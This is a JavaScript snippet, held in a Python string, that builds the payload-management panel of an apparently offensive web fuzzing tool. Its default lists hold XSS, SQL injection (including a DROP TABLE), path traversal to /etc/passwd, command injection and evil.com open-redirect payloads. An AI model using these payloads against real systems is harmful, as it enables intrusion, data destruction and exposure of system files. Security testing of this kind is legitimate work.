PAYLOADS_TAB_JS = r"""
container.innerHTML = '';
                
                var pLabel = document.createElement('div');
                pLabel.innerText = 'Manage Fuzzer & Forms Payloads';
                pLabel.style.fontWeight = 'bold';
                pLabel.style.marginBottom = '10px';
                pLabel.style.color = '#ff0055';
                pLabel.style.textAlign = 'center';
                container.appendChild(pLabel);

                var catSelect = document.createElement('select');
                catSelect.style.width = '100%';
                catSelect.style.padding = '8px';
                catSelect.style.background = '#222';
                catSelect.style.color = '#fff';
                catSelect.style.border = '1px solid #444';
                catSelect.style.marginBottom = '10px';
                catSelect.style.borderRadius = '4px';
                
                var cats = Object.keys(window.__vulcanx_state.payloads || {});
                cats.forEach(function(cat) {
                    var opt = document.createElement('option');
                    opt.value = cat;
                    opt.innerText = cat.toUpperCase() + ' Payloads';
                    catSelect.appendChild(opt);
                });
                container.appendChild(catSelect);

                var pArea = document.createElement('textarea');
                pArea.style.width = '100%';
                pArea.style.height = '220px';
                pArea.style.background = '#111';
                pArea.style.color = '#00ff55';
                pArea.style.border = '1px solid #333';
                pArea.style.fontFamily = 'monospace';
                pArea.style.fontSize = '11px';
                pArea.style.padding = '8px';
                pArea.style.marginBottom = '10px';
                pArea.style.borderRadius = '4px';
                pArea.style.whiteSpace = 'pre';
                container.appendChild(pArea);

                var updateArea = function() {
                    var cat = catSelect.value;
                    if (window.__vulcanx_state.payloads[cat]) {
                        pArea.value = window.__vulcanx_state.payloads[cat].join('\n');
                    }
                };
                catSelect.onchange = updateArea;
                updateArea();

                var pBtnGroup = document.createElement('div');
                pBtnGroup.style.display = 'flex';
                pBtnGroup.style.gap = '10px';

                var saveBtn = document.createElement('button');
                saveBtn.innerText = 'Save Changes';
                saveBtn.style.flex = '1';
                saveBtn.style.padding = '10px';
                saveBtn.style.background = '#006644';
                saveBtn.style.color = '#fff';
                saveBtn.style.border = 'none';
                saveBtn.style.borderRadius = '4px';
                saveBtn.style.cursor = 'pointer';
                saveBtn.style.fontWeight = 'bold';
                saveBtn.onclick = function() {
                    var cat = catSelect.value;
                    var lines = pArea.value.split('\n').map(function(l) { return l.trim(); }).filter(function(l) { return l.length > 0; });
                    window.__vulcanx_state.payloads[cat] = lines;
                    var tst = document.createElement('div');
                    tst.className = 'vx-toast';
                    tst.style.position = 'fixed';
                    tst.style.bottom = '20px';
                    tst.style.right = '20px';
                    tst.style.background = 'rgba(0,102,68,0.9)';
                    tst.style.color = '#fff';
                    tst.style.padding = '10px 16px';
                    tst.style.borderRadius = '6px';
                    tst.style.zIndex = '999999';
                    tst.style.fontSize = '12px';
                    tst.innerText = cat.toUpperCase() + ' Payloads Saved! (' + lines.length + ' payloads)';
                    document.body.appendChild(tst);
                    setTimeout(function() { tst.style.opacity = '0'; setTimeout(function() { tst.remove(); }, 500); }, 3000);
                };
                pBtnGroup.appendChild(saveBtn);

                var resetBtn = document.createElement('button');
                resetBtn.innerText = 'Reset to Default';
                resetBtn.style.flex = '1';
                resetBtn.style.padding = '10px';
                resetBtn.style.background = '#440000';
                resetBtn.style.color = '#fff';
                resetBtn.style.border = 'none';
                resetBtn.style.borderRadius = '4px';
                resetBtn.style.cursor = 'pointer';
                resetBtn.style.fontWeight = 'bold';
                resetBtn.onclick = function() {
                    var defaults = {
                        xss: ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>", '<svg onload=alert(1)>', 'javascript:alert(1)', '<img src=x onerror=alert(document.cookie)>', '{{7*7}}', '${7*7}'],
                        sqli: ["'", '"', "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)--"],
                        lfi: ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '....//....//etc/passwd', '%2e%2e%2fetc%2fpasswd'],
                        cmd: ['; id', '| id', '&& id', '`id`', '$(id)', '; cat /etc/passwd', '| whoami'],
                        open_redirect: ['//evil.com', 'https://evil.com', '//google.com/%2F..', 'javascript:alert(1)']
                    };
                    var cat = catSelect.value;
                    if (defaults[cat]) {
                        window.__vulcanx_state.payloads[cat] = defaults[cat];
                        pArea.value = defaults[cat].join('\n');
                    }
                };
                pBtnGroup.appendChild(resetBtn);
                container.appendChild(pBtnGroup);
"""
